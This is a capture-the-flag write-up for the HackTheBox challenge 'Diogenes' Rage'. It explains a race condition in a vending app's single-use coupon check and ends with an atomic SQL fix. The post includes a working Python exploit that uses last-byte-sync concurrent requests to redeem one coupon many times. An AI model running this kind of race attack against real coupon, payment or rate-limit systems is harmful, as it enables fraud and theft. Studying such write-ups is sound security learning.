---
title: "Diogenes' Rage"
date: 2027-04-16 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, race-condition, toctou, last-byte-sync, cwe-362, cwe-367]
description: "An Easy Web challenge where a vending machine sells a flag you can't afford. The only coupon is worth a dollar and is single-use — but 'single-use' is enforced with a non-atomic check-then-write, so firing the redemption concurrently stacks it as many times as you like. Classic limit-overrun race, with the practical wrinkles that actually make it fire."
---

## Overview

Diogenes' Rage is an Easy HackTheBox **Web** challenge — a Node/Express vending-machine
app backed by SQLite. The flag is sold as item **C8** for **$13.37**, but your balance
starts at **$0.00** and the only top-up is a single coupon worth **$1.00** that is meant
to be redeemable exactly once. The redemption is implemented as a
[time-of-check / time-of-use](https://cwe.mitre.org/data/definitions/367.html) sequence,
so racing it with concurrent requests stacks the credit far past the limit — enough to
buy the flag.

## The technique

The flag handler only fires when you successfully purchase item `C8`:

```js
if (product.item_name == 'C8') return res.json({ flag: fs.readFileSync('/app/flag').toString(), ... })
```

The single-use coupon is guarded like this in `/api/coupons/apply`:

```js
if (user.coupons.includes(coupon_code)) {              // (1) CHECK: already redeemed?
    return res.status(401).send(response("This coupon is already redeemed!"));
}
return db.getCouponValue(coupon_code).then(coupon => {
    if (coupon) {
        return db.addBalance(user.username, coupon.value)        // (2) +$1.00
            .then(() => db.setCoupon(user.username, coupon_code) // (3) MARK redeemed
                .then(() => res.send(...)));
    }
});
```

Step **(1) check** and step **(3) mark-redeemed** are separated by two awaited database
round-trips, with no lock and no atomic conditional update. This is a
[limit-overrun race condition](https://cwe.mitre.org/data/definitions/362.html): if many
requests arrive at once, they **all** read `coupons = ""` at step (1), **all** pass the
guard, and **all** run step (2) `+$1.00` before any of them reaches step (3). One coupon
becomes unlimited money.

## Solution

Two practical details turn a "should work" race into a "works" race:

1. **Same user.** Every request without a `session` cookie mints a fresh random user, so
   a naive concurrent loop credits 40 different accounts and nothing stacks. Establish one
   session first and reuse its cookie on every racing request.
2. **True simultaneity.** Python's `requests.Session` funnels everything through one
   connection pool and serializes — you get exactly one win. Use one raw socket per request
   plus the **last-byte-sync** trick: pre-send every byte except the final one on all
   connections, hold them on a `threading.Barrier`, then release the last byte everywhere
   at once so the requests complete in the same instant.

Create `solve.py`:

```python
import sys, socket, threading, requests
BASE = sys.argv[1].rstrip('/')
host = BASE.split('//')[1].split(':')[0]; port = int(BASE.split(':')[2])
COUPON, N = 'HTB_100', 40

s = requests.Session()
s.post(f'{BASE}/api/coupons/apply', json={'coupon_code': '__seed__'})
cookie = f"session={s.cookies.get('session')}"

body = '{"coupon_code":"%s"}' % COUPON
req = (f"POST /api/coupons/apply HTTP/1.1\r\nHost: {host}:{port}\r\n"
       f"Cookie: {cookie}\r\nContent-Type: application/json\r\n"
       f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}").encode()

barrier = threading.Barrier(N); results = []
def fire():
    so = socket.create_connection((host, port))
    so.sendall(req[:-1])
    barrier.wait()
    so.sendall(req[-1:])
    results.append('redeemed successfully' in so.recv(4096).decode(errors='replace'))
    so.close()

ts = [threading.Thread(target=fire) for _ in range(N)]
[t.start() for t in ts]; [t.join() for t in ts]
print('race wins:', sum(results))

print(s.post(f'{BASE}/api/purchase', json={'item': 'C8'}).json())
```

Run it against the instance:

```bash
python3 solve.py http://<ip>:<port>
```

```
race wins: 35
{'flag': 'HTB{...}', 'message': 'Thank you for your order! $21.63 coupon credits left!'}
```

Thirty-five of forty redemptions land, the balance jumps to $35, the `C8` purchase clears,
and the response carries the flag (redacted here).

## Why it worked

The economic invariant — "one coupon equals exactly one dollar, once" — was enforced with a
separate read and write. Concurrency collapses the gap between reading "not redeemed yet"
and writing "redeemed", so the `+$1.00` effect multiplies once per request that slips into
the window.

## Fix / defense

Make redemption atomic and idempotent — let the database enforce the guard inside the same
statement that applies the credit:

```sql
UPDATE userData SET balance = balance + :v, coupons = coupons || :c
WHERE username = :u AND coupons NOT LIKE '%' || :c || '%';
```

Equivalently, add a `UNIQUE (user, coupon_code)` redemption row, or wrap the check and
update in a serializable transaction / `SELECT ... FOR UPDATE`. Never enforce a one-time or
limit rule with a check and a write that another request can interleave.
